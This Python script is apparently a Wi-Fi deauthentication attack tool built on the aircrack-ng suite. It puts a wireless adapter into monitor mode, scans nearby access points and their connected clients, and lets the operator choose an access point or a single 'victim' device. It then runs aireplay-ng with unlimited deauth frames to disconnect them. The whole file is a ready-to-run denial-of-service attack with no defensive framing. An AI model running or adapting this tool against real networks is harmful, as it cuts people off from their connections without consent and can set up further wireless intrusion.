import subprocess, os, csv, time
from asyncio.subprocess import DEVNULL
from helper import *

active_APs = []
active_victims = []
nic = None

def setup_nic():
    global nic

    # Get NICs
    NICs = get_NICs()

    if not NICs:
        print(error("No Wifi Adapters found."))
        exit()
    
    if len(NICs) == 1:
        nic = NICs[0]
        print(f"Wifi adapter {success(nic)} will be used for the attack.")
    else:
        print("The following WiFi adapters were found:")
        for k, v in enumerate(NICs):
            print(f"{k} - {v}")

        # Choose NIC 
        while True:
            if len(NICs) == 1:
                nic_index = 0 
                break
            nic_index = input("Select any of the following NICs: ")
            try:
                if NICs[int(nic_index)]:
                    break
            except:
                print("Please enter a number that corresponds with the choices available.")

        nic = NICs[int(nic_index)]

    print(f"Killing intrusive system processes...", end=" ")
    subprocess.run(cmd("sudo airmon-ng check kill"), stdout=DEVNULL)
    print(success("Done."))

    print(f"Putting {nic} into monitored mode...", end=" ")
    subprocess.run(cmd(f"sudo airmon-ng start {nic}"), stdout=DEVNULL)
    nic += "mon"
    print(success("Done.\n"))

def scan_access_points():
    global active_APs, nic

    subprocess.Popen(cmd(f"sudo airodump-ng -w file --write-interval 1 --output-format csv {nic}"), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    try:
        while True:
            subprocess.call("clear", shell=True)

            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', \
                'Speed', 'Privacy', 'Cipher', 'Authentication', \
                'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']

            csv_files = list(filter(lambda x: '.csv' in x, os.listdir('.')))

            if not csv_files:
                continue
        
            with open(csv_files[0]) as file:
                file.seek(0)

                csv_reader = csv.DictReader(file, fieldnames=fieldnames)
                for row in csv_reader:
                    if row["BSSID"] == "BSSID":
                        continue 

                    if row["BSSID"] == "Station MAC":
                        break

                    if not device_present(lambda x: row['ESSID'] in x['ESSID'], active_APs):
                        active_APs.append(row)

            print("Scanning. Press Ctrl+C to stop scanning and choose AP to attack.\n")
            print("No |\tBSSID              |\tChannel|\tESSID                         |")
            print("___|\t___________________|\t_______|\t______________________________|")
            for index, item in enumerate(active_APs):
                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
            time.sleep(1)
    except FileExistsError:
        print(error("CSV file not found."))
        reset_nic(nic)
    except KeyboardInterrupt:
        delete_csv()
    except Exception as e:
        print(error(e))
        reset_nic(nic)

def choose_access_point():
    global active_APs
    while True:
        try:
            choice = input("Please select one of the access points above: ")
            if active_APs[int(choice)]:
                AP = active_APs[int(choice)]
                break
        except KeyboardInterrupt:
            reset_nic(nic)
            exit()
        except:
            print(error("Invalid choice. Please try again."))

    ap_mac = AP["BSSID"]
    ap_channel = AP["channel"].strip()

    return ap_mac, ap_channel

def choose_attack_mode():
    subprocess.call("clear", shell=True) 

    print("1. Attack all connected devices.")
    print("2. Select a device to attack.")

    while True:
        try:
            val = int(input("Choose an option: "))

            if not val or not (1<=val<=2): raise ValueError()

            return val

        except ValueError:
            print("Invalid choice. Try Again.")
            continue
        except KeyboardInterrupt:
            reset_nic(nic)
            print(success("Bye"))
            exit()
        except Exception as e:
            print(error(e))
            reset_nic(nic)
            exit()

def scan_victims(ap_mac):
    global nic
    subprocess.Popen(cmd(f"sudo airodump-ng -w file --write-interval 1 --output-format csv --bssid {ap_mac} {nic}"), stdout=DEVNULL, stderr=DEVNULL)

    try:
        while True:
            subprocess.call("clear", shell=True) 

            fieldnames = ['Station_Mac', 'First_time_seen', 'Last_time_seen', 'Power', '#_packets', 'BSSID', 'Probed_ESSIDs']

            csv_files = list(filter(lambda x: '.csv' in x, os.listdir('.')))

            if not csv_files:
                continue

            with open(csv_files[0]) as file:
                file.seek(0)

                csv_reader = csv.DictReader(file, fieldnames=fieldnames)
                for row in csv_reader:
                    invalid_row = row['Station_Mac']=='BSSID' or row['Station_Mac']=='Station MAC' or row['Station_Mac']==ap_mac

                    if invalid_row:
                        continue
                    
                    if not device_present(lambda x: row['Station_Mac'] in x['Station_Mac'], active_victims):
                        active_victims.append(row)

            print("Scanning. Press Ctrl+C to cancel scanning.")
            print("No |\tClient Mac         |\tSignal Power     |")
            print("___|\t___________________|\t_________________|")
            for index, item in enumerate(active_victims):
                print(f"{index}\t{item['Station_Mac']}\t{item['Power']}")
            time.sleep(0.5)

    except FileNotFoundError:
        print(error("CSV file not found."))
        reset_nic(nic)
        exit()
    except KeyboardInterrupt:
        delete_csv()
    except Exception as e:
        print(error(e))
        reset_nic(nic)
        exit()

def choose_victim():
    global nic, active_victims

    while True:
        try: 
            victim_idx = int(input("Choose a victim: "))
            
            if not active_victims[victim_idx]: raise ValueError()

            victim = active_victims[victim_idx]["Station_Mac"]

            return victim

        except ValueError:
            print("Invalid input. Try again.")
            continue
        except KeyboardInterrupt:
            reset_nic(nic)
            print(success("Bye!"))
            exit() 
        except Exception as e:
            print(error(e))
            reset_nic(nic)
            print(success("Bye!"))
            exit() 

def attack(ap_mac, ap_channel, victim=None):
    global nic
    subprocess.run(cmd(f"sudo airmon-ng start {nic} {ap_channel}"), stdout=DEVNULL)

    try:
        if not victim: 
            subprocess.run(cmd(f"sudo aireplay-ng --deauth 0 -a {ap_mac} {nic}"))
        else:
            subprocess.run(cmd(f"sudo aireplay-ng --deauth 0 -c {victim} -a {ap_mac} {nic}"))

    except KeyboardInterrupt:
        reset_nic(nic)
    finally:
        print(success("Bye!"))

if __name__ == '__main__':

    if not is_root():
        print(error("You need to run as root."))
        exit()

    setup_nic()
    scan_access_points()
    mac, ch = choose_access_point()

    attack_mode = choose_attack_mode()
    if attack_mode == SELECT_VICTIM:
        scan_victims(mac)
        victim = choose_victim()

    attack(mac, ch, victim)